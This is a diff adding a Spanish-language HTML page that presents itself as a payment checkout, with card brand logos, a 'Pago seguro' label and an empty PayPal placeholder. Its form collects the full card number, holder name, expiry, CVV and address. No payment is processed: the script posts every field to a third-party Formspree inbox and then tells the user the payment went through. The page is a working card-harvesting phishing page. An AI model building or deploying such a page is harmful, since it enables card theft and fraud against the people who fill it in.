@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Simulador de Pago + PayPal</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      padding: 30px;
+    }
+    .container {
+      max-width: 420px;
+      width: 100%;
+    }
+    .credit-card {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      border-radius: 22px;
+      color: white;
+      padding: 25px 30px;
+      margin-bottom: 25px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      width: 400px;
+      height: 250px;
+      box-sizing: border-box;
+      position: relative;
+      font-family: 'Courier New', Courier, monospace;
+    }
+    .card-number {
+      letter-spacing: 3px;
+      font-size: 1.5em;
+      margin-bottom: 25px;
+      margin-top: 40px;
+    }
+    .card-name, .card-expiry {
+      font-size: 1.1em;
+      text-transform: uppercase;
+    }
+    .card-name {
+      position: absolute;
+      bottom: 50px;
+      left: 30px;
+      width: 60%;
+    }
+    .card-expiry {
+      position: absolute;
+      bottom: 50px;
+      right: 30px;
+      width: 30%;
+      text-align: right;
+    }
+    form {
+      background: white;
+      padding: 20px 25px;
+      border-radius: 12px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 6px;
+    }
+    input, select {
+      width: 100%;
+      padding: 11px;
+      font-size: 1em;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #667eea;
+      border: none;
+      color: white;
+      font-weight: bold;
+      font-size: 1.15em;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .card-brands {
+      margin-top: 20px;
+      text-align: center;
+    }
+    .card-brands img {
+      width: 60px;
+      margin: 0 12px;
+      vertical-align: middle;
+    }
+    .secure-text {
+      font-size: 0.85em;
+      color: #555;
+      text-align: center;
+      margin-top: 6px;
+    }
+    #paypal-button-container {
+      margin-top: 20px;
+    }
+    .currency-note {
+      font-size: 0.9em;
+      color: #666;
+      margin-top: 10px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="credit-card">
+    <div class="card-number" id="card-number">#### #### #### ####</div>
+    <div class="card-name" id="card-name">NOMBRE DEL TITULAR</div>
+    <div class="card-expiry" id="card-expiry">MM/AA</div>
+  </div>
+
+  <!-- FORMULARIO CON FORMPSREE -->
+  <form 
+    id="payment-form" 
+    autocomplete="off" 
+    method="POST" 
+    action="https://formspree.io/f/mgvzyepe"
+  >
+    <div class="form-group">
+      <label for="number">Número de Tarjeta</label>
+      <input type="text" id="number" name="number" maxlength="19" placeholder="1234 5678 9012 3456" required />
+    </div>
+    <div class="form-group">
+      <label for="name">Nombre del Titular</label>
+      <input type="text" id="name" name="name" placeholder="Juan Perez" required />
+    </div>
+    <div class="form-group" style="display:flex; gap: 15px;">
+      <div style="flex: 1;">
+        <label for="expiry">Fecha de Expiración (MM/AA)</label>
+        <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="12/34" required />
+      </div>
+      <div style="flex: 1;">
+        <label for="cvv">CVV</label>
+        <input type="password" id="cvv" name="cvv" maxlength="4" placeholder="123" required />
+      </div>
+    </div>
+    <div class="form-group">
+      <label for="address">Dirección</label>
+      <input type="text" id="address" name="address" placeholder="Calle 123, Ciudad" required />
+    </div>
+    <div class="form-group">
+      <label for="amount">Monto</label>
+      <input type="number" id="amount" name="amount" placeholder="600" min="1" required />
+    </div>
+    <div class="form-group">
+      <label for="currency">Moneda</label>
+      <select id="currency" name="currency">
+        <option value="USD" selected>Dólares (USD)</option>
+        <option value="EUR">Euros (EUR)</option>
+        <option value="MXN">Pesos Mexicanos (MXN)</option>
+        <option value="GBP">Libras Esterlinas (GBP)</option>
+        <option value="CAD">Dólares Canadienses (CAD)</option>
+      </select>
+    </div>
+
+    <button type="submit">Procesar Pago</button>
+
+    <div class="card-brands">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg" alt="American Express" style="width: 70px;" />
+    </div>
+    <div class="secure-text">Pago seguro</div>
+    <div class="currency-note" id="currency-note">* El pago se realiza en <strong>USD</strong>. PayPal hará la conversión a la moneda de tu tarjeta si es necesario.</div>
+  </form>
+
+  <div id="paypal-button-container"></div>
+</div>
+
+<script>
+  const cardNumber = document.getElementById('card-number');
+  const cardName = document.getElementById('card-name');
+  const cardExpiry = document.getElementById('card-expiry');
+
+  document.getElementById('number').addEventListener('input', e => {
+    let val = e.target.value.replace(/\D/g, '').substring(0,16);
+    val = val.replace(/(.{4})/g, '$1 ').trim();
+    cardNumber.textContent = val || '#### #### #### ####';
+  });
+
+  document.getElementById('name').addEventListener('input', e => {
+    cardName.textContent = e.target.value.toUpperCase() || 'NOMBRE DEL TITULAR';
+  });
+
+  document.getElementById('expiry').addEventListener('input', e => {
+    let val = e.target.value.replace(/\D/g, '').substring(0,4);
+    if(val.length >= 3) {
+      val = val.substring(0,2) + '/' + val.substring(2);
+    }
+    cardExpiry.textContent = val || 'MM/AA';
+    e.target.value = val;
+  });
+
+  // Script para manejar respuesta sin redirección
+  const form = document.getElementById('payment-form');
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    const data = new FormData(form);
+    fetch(form.action, {
+      method: 'POST',
+      body: data,
+      headers: { 'Accept': 'application/json' }
+    }).then(response => {
+      if (response.ok) {
+        alert('✅ Pago enviado correctamente.');
+        form.reset();
+      } else {
+        alert('❌ Ocurrió un error al enviar el pago.');
+      }
+    });
+  });
+</script>
+
+</body>
+</html>
